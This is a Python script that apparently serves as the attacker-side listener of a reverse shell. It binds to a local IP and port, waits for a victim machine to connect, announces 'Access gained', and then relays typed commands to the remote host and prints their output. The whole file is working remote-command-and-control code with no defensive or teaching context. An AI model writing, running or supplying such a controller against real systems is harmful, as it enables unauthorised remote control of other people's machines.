import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.1.2"
        port = 9998
        s = socket.socket()
    except socket.error as msg:
        print("Problem connecting the socket ;_;..." + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        print("Trying to bind.........." + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Problem connecting the socket ;_;..." + str(msg))
        bind_socket()


def socket_accept():
    while True:
        conn,address = s.accept()
        print("Connection has been established......to IP " + address[0] + " and port " + str(address[1]))
        send_command(conn)
        conn.close()

def send_command(conn):
    print("Access gained...................Now you can run commands here.........................")
    while True:
        print("Enter command: ")
        cmd = input()
        if cmd == "quit":
                
                conn.close()
                s.close()
                sys.exit()

    
        if len(str.encode(cmd)) > 0:
                
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024),"utf-8")
                print(client_response, end = "")



def main():
    create_socket()
    bind_socket()
    socket_accept()

main()


